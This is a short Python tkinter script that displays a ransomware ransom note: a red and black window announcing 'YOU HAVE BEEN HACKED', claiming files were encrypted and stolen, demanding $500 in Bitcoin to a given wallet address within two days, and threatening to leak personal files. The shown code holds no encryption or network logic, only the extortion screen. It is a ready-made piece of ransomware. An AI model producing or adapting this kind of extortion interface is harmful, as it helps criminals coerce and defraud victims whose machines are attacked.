import tkinter
from PIL import ImageTk
import PIL.Image
from tkinter import *


def gui():
    window = tkinter.Tk()
    window.grid()
    window.title('You have been hacked')
    window.configure(background='#CC3300')

    ''' FIRST FRAME ########################################'''
    fullframe = tkinter.Frame(window)
    fullframe.grid(row=0, column=1, pady='0.05', padx='2')
    fullframe.configure(bg='#CC3300', borderwidth=1)

    label1 = tkinter.Label(fullframe)
    label1.grid(ipadx='91', ipady='1', pady='1', padx='10', row=0, column=1)
    label1.configure(text=
                     """
YOU HAVE BEEN HACKED.
""")
    label1.configure(fg='green')
    label1.configure(bg='black')
    label1.configure(padx='20')
    label1.configure(font='hack')
    label1.configure(pady='10')
    label1.configure(height='1')

    '''SECOND FRAME ########################################'''
    frame = tkinter.Frame(window)
    frame.grid(row=0, column=1, pady='10')
    frame.configure(borderwidth=5, pady='2')

    label2 = tkinter.Label(fullframe)
    label2.grid(pady='1', row=2, column=1)
    label2.configure(fg='green')
    label2.configure(bg='black')
    label2.configure(pady='110')
    label2.configure(padx='60')
    label2.configure(font=('hack', 8, 'bold'))
    label2.configure(height='1')
    label2.configure(text="""
Purchase Decryption key in Bitcoin.
WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES.
WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES
YOUR FILES HAVE ALSO BEEN COPIED AD SENT TO US.
YOU HAVE BETWEEN NOW AND THE NEXT TWO DAYS TO PAY $500 IN BITCOIN 
TO THE BTC WALLET BELLOW. NOW THATS NOT SO MUCH IS IT?

btc WALLET ADDRESS: bc1q6gl2ea9ennwucazn55kfmu9hthpfdw828xpl9a

The wallet address is case sensitive so copy carefully as it is.

FAILURE TO DO SO WITHIN THE GIVEN TIME WILL LEAD TO AN INCREASE IN 
PAYMENTS AND SOME OF YOUR PERSONAL FILES WILL BE RELEASED ON THE INTERNET.
AFTER MAKING THE PAYMENT, SEND A PROOF OF PAYMENT TO THE EMAIL ADDRESS 
BELOW AND YOY WILL BE REPLIED WITH THE DECRYPTION SOFTWARE ONCE VERIFIED.

                  """)

    ''' THIRD FRAME ########################################'''
    tframe = tkinter.Frame(window)
    tframe.grid(row=0, column=2, pady='10')
    tframe.configure(borderwidth=2, pady='2', bg='white')

    label3 = tkinter.Label(fullframe)
    label3.grid(padx='5', ipady='1', pady='2', row=0, column=3)
    label3.configure(fg='black')
    label3.configure(bg='white')
    label3.configure(pady='20')
    label3.configure(padx='65')
    label3.configure(font=('hack', 8, 'bold'))
    label3.configure(height='1')
    label3.configure(text=
                     """
INFO
""", )

    window.mainloop()


gui()
